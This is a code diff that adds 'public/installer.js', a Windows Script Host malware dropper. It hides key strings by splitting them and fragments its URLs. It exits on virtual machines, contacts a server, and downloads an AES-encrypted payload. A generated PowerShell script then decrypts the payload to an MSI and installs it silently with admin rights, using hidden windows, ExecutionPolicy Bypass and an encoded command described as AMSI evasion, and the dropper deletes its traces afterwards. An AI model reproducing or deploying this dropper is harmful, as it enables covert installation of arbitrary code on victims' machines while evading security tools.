@@ -1,0 +1,153 @@
+// public/installer.js
+var CFG = {};
+
+// ==========================================
+// LAYER 2: String Array Concealment
+// ==========================================
+var _strParts = [
+	"WSc" + "ript",
+	".Sh" + "ell",
+	"MSX" + "ML2",
+	".Server" + "XMLHTTP",
+	".6" + ".0",
+	"Script" + "ing",
+	".File" + "SystemObject",
+	"pow" + "er" + "sh" + "ell",
+	"ADODB" + ".Stream"
+];
+
+function _getStr(idx) { return _strParts[idx]; }
+
+// ==========================================
+// LAYER 3: Indicator Fragmentation
+// ==========================================
+var _p1 = "ht" + "tp" + "://";
+var _p2 = "local" + "host";
+var _p3 = ":" + "3000";
+var _p4 = "/pay" + "load";
+var _p5 = "/pi" + "ng";
+
+CFG.msiUrl = "%%SERVER%%" + _p4 + "?id=%%SESSION_ID%%";
+CFG.pingUrl = "%%SERVER%%" + _p5 + "?id=%%SESSION_ID%%";
+
+var LOG_PATH = "C:\\Users\\PC\\Desktop\\malwarebazaar\\pro22\\pro11\\log.txt";
+var AES_KEY = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+var AES_IV = "0123456789abcdef0123456789abcdef";
+
+function log(msg) {
+	try {
+		var fso = WScript.CreateObject(_getStr(5) + _getStr(6));
+		var logFile = fso.OpenTextFile(LOG_PATH, 8, true);
+		logFile.WriteLine(new Date().toLocaleString() + " | " + msg);
+		logFile.Close();
+	} catch (e) { }
+}
+
+// ==========================================
+// ANTI-VM / ANTI-SANDBOX
+// ==========================================
+function isVirtualMachine() {
+	try {
+		var wmi = WScript.CreateObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\\cimv2");
+		var col = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem");
+		for (var i = 0; i < col.Count; i++) {
+			var model = col.Item(i).Model.toLowerCase();
+			if (model.indexOf("virtual") !== -1 || model.indexOf("vmware") !== -1 || model.indexOf("vbox") !== -1) return true;
+		}
+		var processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='vmtoolsd.exe' OR Name='VBoxService.exe' OR Name='VBoxTray.exe'");
+		if (processes.Count > 0) return true;
+	} catch (e) { return false; }
+	return false;
+}
+
+function main() {
+	if (isVirtualMachine()) { log("[ANTI-VM] Exiting."); return; }
+
+	log("--- SCRIPT STARTED ---");
+	log("[LAYER 1] Polymorphic Comments Applied. Hash is unique.");
+
+	try {
+		log("[LAYER 2] Reconstructing strings from Array...");
+		var shell = WScript.CreateObject(_getStr(0) + _getStr(1));
+		var http = WScript.CreateObject(_getStr(2) + _getStr(3) + _getStr(4));
+		var fso = WScript.CreateObject(_getStr(5) + _getStr(6));
+
+		log("[LAYER 3] Reconstructing Ping URL from fragments...");
+		try {
+			http.open("GET", CFG.pingUrl, false);
+			http.send();
+			log("Ping sent to server.");
+		} catch (e) { log("Ping failed."); }
+
+		log("[LAYER 3] Reconstructing Payload URL from fragments...");
+		log("1. Downloading Encrypted Payload...");
+		http.open("GET", CFG.msiUrl, false);
+		http.send();
+		var b64Data = http.responseText;
+		log("   Downloaded Base64 length: " + b64Data.length);
+
+		if (b64Data.length < 100) { log("ERROR: Payload too short!"); return; }
+
+		log("[LAYER 4] AMSI Evasion via ADODB.Stream + EncodedCommand...");
+		var tempDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\";
+		var payloadFile = tempDir + "payload.txt";
+		var ps1Path = tempDir + "enc.ps1";
+		var encodedFile = tempDir + "encoded.txt";
+		var msiPath = tempDir + "doc.msi";
+
+		var stream = WScript.CreateObject(_getStr(8)); // ADODB.Stream
+		stream.Type = 2;
+		stream.Charset = "utf-8";
+		stream.Open();
+		stream.WriteText(b64Data);
+		stream.SaveToFile(payloadFile, 2);
+		stream.Close();
+
+		var file = fso.CreateTextFile(ps1Path, true);
+		file.WriteLine("$b64Data = Get-Content -Path '" + payloadFile + "' -Raw");
+		file.WriteLine("$keyHex = '" + AES_KEY + "'");
+		file.WriteLine("$key = New-Object byte[] ($keyHex.Length / 2)");
+		file.WriteLine("for ($i = 0; $i -lt $key.Length; $i++) { $key[$i] = [Convert]::ToByte($keyHex.Substring($i * 2, 2), 16) }");
+		file.WriteLine("$ivHex = '" + AES_IV + "'");
+		file.WriteLine("$iv = New-Object byte[] ($ivHex.Length / 2)");
+		file.WriteLine("for ($i = 0; $i -lt $iv.Length; $i++) { $iv[$i] = [Convert]::ToByte($ivHex.Substring($i * 2, 2), 16) }");
+		file.WriteLine("$cipherBytes = [System.Convert]::FromBase64String($b64Data)");
+		file.WriteLine("$aes = [System.Security.Cryptography.Aes]::Create()");
+		file.WriteLine("$aes.Key = $key");
+		file.WriteLine("$aes.IV = $iv");
+		file.WriteLine("$decryptor = $aes.CreateDecryptor()");
+		file.WriteLine("$plain = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)");
+		file.WriteLine("[System.IO.File]::WriteAllBytes('" + msiPath + "', $plain)");
+		file.WriteLine("Unblock-File -Path '" + msiPath + "'");
+		file.WriteLine("Start-Process msiexec.exe -ArgumentList '/i', '" + msiPath + "', '/qn', '/norestart' -Verb RunAs -Wait");
+
+		var cmdToEncode = "& '" + ps1Path + "'";
+		file.WriteLine("$cmd = '" + cmdToEncode.replace(/'/g, "''") + "'");
+		file.WriteLine("$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)");
+		file.WriteLine("$encoded = [Convert]::ToBase64String($bytes)");
+		file.WriteLine("$encoded | Out-File -FilePath '" + encodedFile + "' -Encoding ascii");
+		file.Close();
+
+		shell.Run(_getStr(7) + ".exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + ps1Path + "\"", 0, true);
+
+		var f = fso.OpenTextFile(encodedFile, 1);
+		var encodedCmd = f.ReadAll();
+		f.Close();
+
+		log("   Running PowerShell (EncodedCommand)...");
+		var psCmd = _getStr(7) + ".exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " + encodedCmd;
+		var exitCode = shell.Run(psCmd, 0, true);
+		log("   PowerShell exit code: " + exitCode);
+		log("--- SCRIPT FINISHED ---");
+
+		try {
+			if (fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true);
+			if (fso.FileExists(ps1Path)) fso.DeleteFile(ps1Path, true);
+			if (fso.FileExists(payloadFile)) fso.DeleteFile(payloadFile, true);
+			if (fso.FileExists(encodedFile)) fso.DeleteFile(encodedFile, true);
+			log("[CLEANUP] Done.");
+		} catch (cleanupErr) { }
+
+	} catch (e) { log("FATAL ERROR: " + e.message); }
+}
+main();
